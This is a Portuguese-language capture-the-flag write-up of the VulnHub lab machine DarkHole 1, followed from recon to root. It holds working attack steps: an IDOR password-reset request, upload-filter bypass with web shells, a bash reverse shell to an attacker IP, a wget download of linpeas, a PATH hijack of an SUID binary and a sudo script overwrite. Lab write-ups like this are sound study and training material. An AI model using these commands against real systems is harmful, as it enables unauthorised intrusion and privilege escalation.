# Darkhole 1 — VulnHub

## 1. Identificação

| Campo | Valor |
|---|---|
| Nome da máquina | DarkHole: 1 |
| Plataforma | VulnHub |
| Dificuldade | Easy/Medium |
| IP alvo (lab) | 10.0.0.33 |
| Hostname interno | `darkhole` |
| Objetivo | Obter user e root flag |
| Flags obtidas | `user.txt` (em `/home/john`), `root.txt` (em `/root`) |

**Cadeia completa em uma linha:** recon → IDOR no `dashboard.php` → reset de password do admin → upload bypass (`.phar` / `.pHp`) → reverse shell → `/home/john/toto` SUID + PATH hijack → `sudo NOPASSWD python3 /home/john/file.py` → **root**.

---

## 2. Reconhecimento inicial

Verificação de que o servidor responde e enumeração inicial de portas/serviços (servidor web Apache na 80).

```bash
curl -kI http://10.0.0.33/
curl -kV "http://10.0.0.33/config/database.php"
```

![Página de login do DarkHole](../assets/Darkhole_1/img01.png)

*Figura 1 — Tela inicial `http://10.0.0.33/`: imagem "The Spark Dimond" com link para login.*

![Formulário /login.php](../assets/Darkhole_1/img02.png)

*Figura 2 — Formulário de autenticação em `/login.php` (assinado "Made by Red Virus").*

---

## 3. Enumeração

### 3.1 Enumeração web com feroxbuster

```bash
feroxbuster -u http://10.0.0.33/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -x php,html,txt,conf -r
```

**Achados relevantes:**

```
200  GET  /login.php
200  GET  /register.php
200  GET  /dashboard.php
301  GET  /config/        → /config/database.php (vazio HTTP, lido só PHP-side)
301  GET  /upload/
200  GET  /upload/d.jpg
302  GET  /logout.php → /login.php
```

### 3.2 Conta inicial na aplicação web

Registo via `/register.php` com utilizador `pedro`. Após login, o utilizador é redirecionado para `dashboard.php?id=4` (id 4 = pedro).

---

## 4. Exploração

### 4.1 IDOR no `dashboard.php` → reset da password do admin

O código da página fazia:

```php
if (isset($_POST['password'])) {
    $pass  = mysqli_real_escape_string($connect, $_POST['password']);
    $idGet = mysqli_real_escape_string($connect, $_POST['id']);   // <-- vem do cliente!
    $connect->query("update users set password='$pass' where id='$idGet'");
}
```

O `id` para o `UPDATE` vem do POST em vez de vir da sessão → **IDOR**. É possível alterar a password de qualquer utilizador. Pedido enviado via Burp:

```
POST /dashboard.php?id=4 HTTP/1.1
Host: 10.0.0.33
Cookie: PHPSESSID=<sessão do pedro>
Content-Type: application/x-www-form-urlencoded

password=hacked&id=1
```

![Burp interceptando o POST do reset de password](../assets/Darkhole_1/img07.png)

*Figura 3 — Burp Suite: POST para `dashboard.php?id=4` enviando `password=hacked&id=1`; resposta mostra "Password Has been Updated".*

![Dashboard normal mostrando "Not Allowed To access"](../assets/Darkhole_1/img04.png)

*Figura 4 — Acesso a `dashboard.php?id=4` (user normal) — sem o formulário de upload.*

![Detalhes do utilizador pedro id=4](../assets/Darkhole_1/img05.png)

*Figura 5 — Dashboard do `pedro` (id=4) com email auto-gerado, antes do IDOR.*

![Painel completo do admin (id=1) — agora com Upload](../assets/Darkhole_1/img03.png)

*Figura 6 — Login como `admin`/`hacked` (id=1): aparece o formulário de upload que só o admin vê.*

### 4.2 Upload bypass → RCE

O filtro é uma **blacklist fraca** que bloqueia apenas `.php` e `.html`:

```php
$exit = pathinfo($fileName, PATHINFO_EXTENSION);
if ($exit != "php" && $exit != "html") {
    move_uploaded_file(...);
}
```

Apache executa muitas outras extensões como PHP. Carreguei com extensões alternativas:

```
simple-backdoor.phar
simple-backdoor_1.pHp     (case bypass)
t.phar
t.php3
t.php5
```

Verificação:

```bash
curl "http://10.0.0.33/upload/t.phar?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

### 4.3 Reverse shell

```bash
# Kali
nc -lvnp 4444

# Disparado pelo web shell
curl "http://10.0.0.33/upload/t.phar?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.0.1.8/4444%200%3E%261'"
```

Resultado: `www-data@darkhole:/var/www/html/upload$`.

---

## 5. Pós-exploração

Enumeração local com **linpeas**:

```bash
# Kali
cd /tmp && python3 -m http.server 8000

# Alvo
cd /tmp
wget http://10.0.1.8:8000/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh
```

**Achados-chave:**

- Kernel `5.4.0-77-generic` — vários CVEs candidatos, mas exploits de kernel **não funcionaram** neste box (Ruby/glibc ausentes, kernel já patched).
- `/home/john/.ssh/` é group-writable por `www-data`, mas `sshd` tem `StrictModes yes` → injecção de `authorized_keys` falha.
- `/home/john/toto` — SUID root executável por todos.
- `/var/www/darkhole.sql` legível; credenciais BD: `john:john` (não corresponde ao SSH).
- Tabela `users`: `admin/admin`, `pedro/<vazio>`, etc.

---

## 6. Escalada de privilégios

### 6.1 `www-data` → `john` via SUID `toto` + PATH hijack

```bash
ls -la /home/john/toto
# -rwsr-xr-x 1 root root 16784 toto

file /home/john/toto
# setuid ELF 64-bit ... dynamically linked, not stripped

strings /home/john/toto | grep -E "setuid|system|id"
# setuid, setgid, system

/home/john/toto
# uid=1001(john) gid=33(www-data) groups=33(www-data)
```

O binário faz `setuid(1001)` e chama `system("id")`. Como usa o nome **relativo** `id` em vez de `/usr/bin/id`, é vulnerável a **PATH hijacking**.

**Exploit:**

```bash
# 1) id malicioso em /tmp
cd /tmp
cat > id <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x id

# 2) /tmp à frente no PATH
export PATH=/tmp:$PATH
which id     # /tmp/id

# 3) Disparar o toto
/home/john/toto
# whoami → john
```

A cadeia:

1. `toto` arranca com `EUID=root` (bit SUID).
2. Chama `setuid(1001)` → EUID/RUID = john.
3. Chama `system("id")` → `/bin/sh -c "id"`.
4. O shell encontra `/tmp/id` primeiro → executa `bash -p`.
5. `-p` impede o bash de baixar privilégios → shell como **john**.

### 6.2 `john` → root via `sudo NOPASSWD` em script Python writable

```bash
john@darkhole:~$ sudo -l
# password: root123   (a que está em /home/john/password — é do john, não do root)

Matching Defaults entries for john on darkhole:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User john may run the following commands on darkhole:
    (root) /usr/bin/python3 /home/john/file.py
```

Como `/home/john` é world-writable (mode 777) e `file.py` é writable, basta sobrescrever o conteúdo:

```bash
echo 'import os; os.system("/bin/bash")' > /home/john/file.py
sudo /usr/bin/python3 /home/john/file.py
# password: root123
```

> Cuidado com typos — o sudoers faz match exacto do path. Ex.: `sudo /usr/bin/python3 /home/jhon/file.py` (typo `jhon`) devolve "user john is not allowed to execute".

**Tentativas que falharam** (documentadas):

- `sudo su` → "user john is not allowed to execute '/usr/bin/su' as root".
- `su -` com `root123` → "Authentication failure".
- `python3 /home/john/file.py` (sem sudo) → só abre bash como `john`.

---

## 7. Flags

```text
root@darkhole:/home/john# whoami
root

root@darkhole:/home/john# id
uid=0(root) gid=0(root) groups=0(root)

root@darkhole:/home/john# cat /root/root.txt
DarkHole{<flag final>}
```

- **user.txt** (`/home/john/user.txt`) — capturada em sessão `john`.
- **root.txt** (`/root/root.txt`) — formato `DarkHole{...}`; o valor exato apenas é visível na captura local final.

---

## 8. Sequência resumida do ataque

1. Descoberta do alvo (10.0.0.33) e enumeração de portas (Apache:80).
2. Enumeração web com feroxbuster → identificação de `/login`, `/register`, `/dashboard`, `/upload`.
3. Registo de utilizador `pedro` (id=4) em `/register.php`.
4. **IDOR** em `dashboard.php` → reset da password do `admin` (id=1) via POST com `id=1`.
5. Login como `admin` → aparece formulário de upload exclusivo.
6. **Upload bypass** com `.phar` / `.pHp` → web shell em `/upload/`.
7. Reverse shell → `www-data`.
8. Enumeração local com linpeas → SUID `/home/john/toto`.
9. **PATH hijack** sobre `system("id")` → shell como `john`.
10. `sudo -l` → `john` pode correr `/usr/bin/python3 /home/john/file.py` como root.
11. Sobrescrever `file.py` com `os.system("/bin/bash")` → **root**.
12. Leitura de `/root/root.txt`.

---

## 9. Lições técnicas

- **IDOR** em parâmetro de UPDATE — nunca aceitar `id` do utilizador para escrever em registos de outros.
- **Blacklist de extensões** é inseguro: Apache executa `.phar`, `.php3`, `.pHp`, `.php5` como PHP.
- **SUID + comando relativo** (`system("id")`) → PATH hijack trivial.
- **`sudo NOPASSWD` em script writable** equivale a NOPASSWD em `/bin/bash`.
- **Diretório de utilizador 777** quebra `StrictModes` do `sshd` (impossível injetar `authorized_keys`) mas continua a permitir reescrever scripts privilegiados.
- Documentar tentativas falhadas (kernel exploits, SSH keys) economiza tempo em iterações futuras.

---

## 10. Referências consultadas

- [Darkhole 1 — VulnHub (entrada oficial)](https://www.vulnhub.com/entry/darkhole-1,724/)
- [Darkhole1 VulnHub CTF — Basit Olasubomi Balogun, Medium](https://medium.com/@basitolasubomibalogun/darkhole1-vulnhub-ctf-full-technical-walkthrough-283ad8c633ad)
- [DarkHole Vulnhub Walkthrough — InfoSec Articles](https://www.infosecarticles.com/darkhole-vulnhub-writeup/)
- [DARKHOLE: 1 VulnHub CTF Walkthrough — Infosec Resources](https://resources.infosecinstitute.com/topic/darkhole-1-vulnhub-ctf-walkthrough/)
- [DarkHole Walkthrough — NepCodeX](https://nepcodex.com/2021/08/darkhole-walkthrough-vulnhub-writeup/)
- [Darkhole 1 — D4nt3](https://andresruizzzzz.github.io/blog/vh-writeup-darkhole1/)
